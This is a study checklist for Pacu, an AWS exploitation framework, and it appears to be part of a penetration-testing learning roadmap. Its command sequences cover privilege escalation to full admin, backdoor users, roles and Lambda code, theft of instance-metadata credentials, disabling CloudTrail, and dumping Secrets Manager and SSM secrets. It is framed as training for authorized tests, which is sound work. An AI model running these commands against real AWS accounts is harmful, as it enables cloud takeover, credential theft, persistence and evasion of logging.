# 🐦 Pacu: Complete Mastery Checklist

> **What is Pacu?** Pacu is an open-source AWS exploitation framework — the AWS equivalent of Metasploit. Built by Rhino Security Labs, it provides a modular interface with 100+ attack modules covering the full AWS attack chain: IAM privilege escalation, credential theft, persistence, lateral movement, data exfiltration, and service-specific exploitation across every major AWS service (EC2, Lambda, ECS, S3, IAM, STS, RDS, Cognito, and more).
>
> **Why does it exist?** Once an attacker has initial AWS access (leaked credentials, SSRF on an EC2 instance, Lambda function compromise), manually running `aws cli` commands to escalate privileges and move laterally is slow and error-prone. Pacu automates the known privilege escalation and lateral movement techniques across AWS services, enabling rapid exploitation.
>
> **When to use it:** AWS pentests after obtaining initial credentials (any level of IAM access), demonstrating the impact of IAM misconfiguration to clients, CTF challenges involving AWS, and understanding the full scope of what an attacker can do with compromised cloud credentials.
>
> **When to avoid it:** Pacu is for authorized pentests only. Running it against AWS accounts you don't own is illegal. Many Pacu modules make highly visible API calls — use in stealth scenarios only with careful module selection. In production environments with CloudTrail and GuardDuty, Pacu will generate immediate alerts.
>
> **What mastering Pacu unlocks:** AWS penetration testing capability, understanding of IAM privilege escalation paths (critical for cloud architecture reviews), demonstration of cloud misconfiguration impact, and the skills needed for cloud-focused red team engagements.
>
> **Roadmap Phase:** Phase 6 — Enterprise & Cloud Security (Cloud Exploitation)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](README.md)

| Cloud Security | Cloud Audit | Enterprise |
|:--------------|:-----------|:-----------|
| **🐦 Pacu** (you are here) | [☁️ Prowler](Prowler.md) | [🩸 BloodHound](BloodHound.md) |
| [🔑 Certipy](Certipy.md) | | [🔧 Impacket](Impacket.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & Session Setup | 5 | 1–2 hours |
| 2 | Reconnaissance Modules | 7 | 3–4 hours |
| 3 | IAM Privilege Escalation | 8 | 4–6 hours |
| 4 | Persistence Techniques | 5 | 3–4 hours |
| 5 | Service-Specific Exploitation | 7 | 4–5 hours |
| 6 | Data Exfiltration & Impact | 5 | 2–3 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| | **Total** | **41** | **~21–30 hours** |

**Prerequisites:** Basic AWS concepts (IAM, S3, EC2, Lambda). Phase 6 cloud security fundamentals. AWS CLI configured with test credentials.

---

# PHASE 1: INSTALLATION & SESSION SETUP

---

## 1.1 Installation

```bash
# Clone and install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# OR: pip install
pip3 install pacu
pacu
```

## 1.2 Pacu Session & Credential Management

```bash
# Start Pacu
pacu

# Create a new session
Pacu (new) > new_session mytargetorg

# Set AWS credentials for the session
Pacu (mytargetorg) > set_keys
# Enter: AWS Access Key ID, AWS Secret Access Key, AWS Session Token (if temp creds)

# Import credentials from environment
Pacu (mytargetorg) > import_keys default    # Import from ~/.aws/credentials profile

# List configured keys
Pacu (mytargetorg) > list_keys

# Switch between sessions
Pacu > sessions
Pacu > swap_session

# View current session data
Pacu (mytargetorg) > whoami
# Shows: UserID, Account ID, ARN of current credentials
```

## 1.3 Core Pacu Commands

```bash
# List all available modules
Pacu > ls

# Search for modules by keyword
Pacu > search iam
Pacu > search s3
Pacu > search privesc

# Run a module
Pacu > run iam__enum_permissions

# Show module help
Pacu > help iam__enum_permissions

# View session data (what Pacu has discovered/stored)
Pacu > data IAM
Pacu > data EC2
Pacu > data S3

# View command history
Pacu > history
```

---

# PHASE 2: RECONNAISSANCE MODULES

---

## 2.1 Identity & Permissions Enumeration

```bash
# Who am I? What is the current identity?
Pacu > run iam__detect_honeytokens    # Check if creds are honeytokens (canary traps)
Pacu > whoami                         # Display current IAM identity

# Enumerate all IAM permissions for current user/role
Pacu > run iam__enum_permissions
# This runs hundreds of API calls testing which actions succeed
# Output: complete list of allowed actions for current identity

# Enumerate all IAM users, groups, roles, and policies in the account
Pacu > run iam__enum_users_roles_policies_groups
Pacu > data IAM   # View the collected data
```

## 2.2 Account Enumeration

```bash
# Enumerate all EC2 instances across all regions
Pacu > run ec2__enum
Pacu > data EC2.Instances

# Enumerate S3 buckets and their contents
Pacu > run s3__enum
Pacu > data S3

# Enumerate Lambda functions (may contain secrets in environment variables)
Pacu > run lambda__enum
Pacu > data Lambda

# Enumerate RDS databases
Pacu > run rds__enum
Pacu > data RDS

# Enumerate all services in all regions (broad discovery)
Pacu > run aws__enum_account
```

---

# PHASE 3: IAM PRIVILEGE ESCALATION

---

## 3.1 The Pacu PrivEsc Module

```bash
# Automatically identify privilege escalation paths based on current permissions
Pacu > run iam__privesc_scan

# Output: Lists all viable PrivEsc paths with:
# - Technique name
# - Required permissions you currently have
# - What you can escalate to
# - Risk level
```

## 3.2 Key IAM Privilege Escalation Techniques

**PrivEsc Technique 1: `iam:CreatePolicyVersion`**
```bash
# If you can create a new version of a managed policy, you can add AdministratorAccess
Pacu > run iam__privesc_scan
# If technique 1 is available:
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**PrivEsc Technique 2: `iam:AttachRolePolicy`**
```bash
# Attach AdministratorAccess to a role you can assume
aws iam attach-role-policy --role-name target-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/target-role \
  --role-session-name escalated
```

**PrivEsc Technique 3: `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`**
```bash
# Create a Lambda with a high-privileged role, invoke it to run arbitrary actions
Pacu > run lambda__backdoor_new_roles   # Automates this pattern
```

**PrivEsc Technique 4: `ec2:RunInstances` + `iam:PassRole`**
```bash
# Launch EC2 with an admin IAM role attached → access instance metadata → get role creds
Pacu > run ec2__startup_shell_script    # Inject startup script to exfil credentials
```

## 3.3 Pacu PrivEsc Automation

```bash
# Pacu's comprehensive privesc module tries all viable paths
Pacu > run iam__privesc_scan --scan-only    # Scan only (don't exploit)
Pacu > run iam__privesc_scan               # Scan AND exploit viable paths

# After escalation — verify new permissions
Pacu > run iam__enum_permissions
Pacu > whoami
```

---

# PHASE 4: PERSISTENCE TECHNIQUES

---

```bash
# Create a backdoor IAM user (new user with AdministratorAccess)
Pacu > run iam__backdoor_users_keys
# Creates access keys for existing users — more subtle than creating new users

# Create a backdoor IAM role (allows external account to assume it)
Pacu > run iam__backdoor_assume_role
# Creates role with trust policy allowing attacker's account to assume it

# Lambda backdoor — inject code into existing Lambda functions
Pacu > run lambda__backdoor_existing_functions
# Adds code to exfiltrate event data to attacker-controlled endpoint

# EC2 backdoor — add SSH key or startup script
Pacu > run ec2__backdoor_instances_userdata

# Maintain persistence via Cognito user pool backdoor
Pacu > run cognito__backdoor_userpool

# View all persistence modules
Pacu > search backdoor
```

---

# PHASE 5: SERVICE-SPECIFIC EXPLOITATION

---

## 5.1 EC2 SSRF & Metadata Service

```bash
# EC2 Instance Metadata Service (IMDS) exploitation
# If you have SSRF on an EC2 instance, access:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns temporary credentials for the EC2's IAM role

# Steal instance credentials
Pacu > run ec2__steal_instance_credentials

# Check if IMDSv2 is required (v1 is vulnerable to SSRF)
Pacu > run ec2__enum
Pacu > data EC2.Instances | grep MetadataOptions
```

## 5.2 S3 Exploitation

```bash
# List all S3 buckets and their public access settings
Pacu > run s3__enum

# Download contents of accessible S3 buckets
Pacu > run s3__download_bucket --bucket-name target-bucket

# Check for misconfigured bucket policies
Pacu > run s3__bucket_finder
```

## 5.3 Lambda & Secrets

```bash
# Enumerate Lambda environment variables (often contain secrets)
Pacu > run lambda__enum
Pacu > data Lambda.Functions
# Look for: API keys, database credentials, tokens in EnvVars

# Enumerate Secrets Manager secrets (if you have access)
Pacu > run secretsmanager__enum
# If GetSecretValue is permitted, Pacu extracts the secret values
```

## 5.4 CloudTrail Disruption (Evidence Evasion)

```bash
# Disable CloudTrail logging (WARNING: immediately visible to defenders)
Pacu > run cloudtrail__download_event_history    # First — exfil logs
Pacu > run cloudtrail__disable_logging           # Then disable

# Disruption of GuardDuty
Pacu > run guardduty__list_accounts
# Disabling GuardDuty requires specific permissions rarely granted to non-admins
```

---

# PHASE 6: DATA EXFILTRATION & IMPACT

---

```bash
# Download all accessible S3 buckets
Pacu > run s3__download_bucket

# Exfiltrate RDS database snapshots
Pacu > run rds__explore_snapshots
# Share a snapshot with attacker's AWS account to access database

# Exfiltrate EBS snapshots
Pacu > run ebs__explore_snapshots

# Enumerate and access SSM Parameter Store (secrets often stored here)
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# Access Secrets Manager (high-value target)
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id /prod/database/password
```

---

# PHASE 7: PRACTICAL LABS

---

- [ ] **Lab 1 — CloudGoat:** Set up Rhino Security Labs' CloudGoat (vulnerable-by-design AWS environment). Work through the "vulnerable_lambda" scenario: start as a low-privileged Lambda IAM user, use Pacu to enumerate permissions, escalate to admin via IAM policy abuse, and reach the final objective.

- [ ] **Lab 2 — IAM PrivEsc Scan:** In a test AWS account, create an IAM user with deliberately over-permissive but not-admin permissions (e.g., `iam:CreatePolicyVersion`). Run `pacu > run iam__privesc_scan`. Document which escalation paths Pacu identifies and execute one to verify.

- [ ] **Lab 3 — Recon Chain:** With minimal IAM permissions (just `iam:GetUser` and `s3:ListBuckets`), use Pacu's enumeration modules to build a complete picture of: what IAM users/roles exist, what S3 buckets are accessible, and what EC2 instances are running. Document everything Pacu can discover without triggering any writes.

- [ ] **Lab 4 — Persistence Demo:** After escalating to admin in the CloudGoat lab, use Pacu to establish persistence via a backdoor IAM user with programmatic access. Verify the backdoor works. Then document and clean up all changes made (good pentest practice).

---

## 📝 Operational Notes

- **Session isolation:** Pacu stores all findings in a SQLite database per session. Sessions are isolated — don't mix client data. Use a new session per engagement: `pacu > new_session clientname_date`.
- **CloudTrail detection:** Almost everything Pacu does generates CloudTrail events. Defenders watching `DescribeInstances`, `ListBuckets`, `GetUser`, `ListPolicies` in rapid succession will notice. Know which modules are loud vs quiet.
- **Module updates:** Pacu modules are actively developed. Run `git pull` regularly. New IAM PrivEsc techniques are added as they're discovered.
- **Pacu vs Boto3 scripting:** Pacu saves time for known techniques. Novel exploitation scenarios require writing custom Python/Boto3 scripts. Know Boto3 basics to extend beyond what Pacu provides.
- **CloudGoat:** The best place to practice Pacu safely. CloudGoat is a purpose-built vulnerable AWS environment by Rhino Security Labs (same team that built Pacu). It has pre-built attack scenarios with walk-throughs. Always use it before engaging real client environments.
- **Responsible use:** Pacu requires explicit written authorization. Running it against any AWS account without authorization violates the AWS Terms of Service and potentially the Computer Fraud and Abuse Act (CFAA) or equivalent laws. Always get authorization in writing before running any cloud exploitation tool.
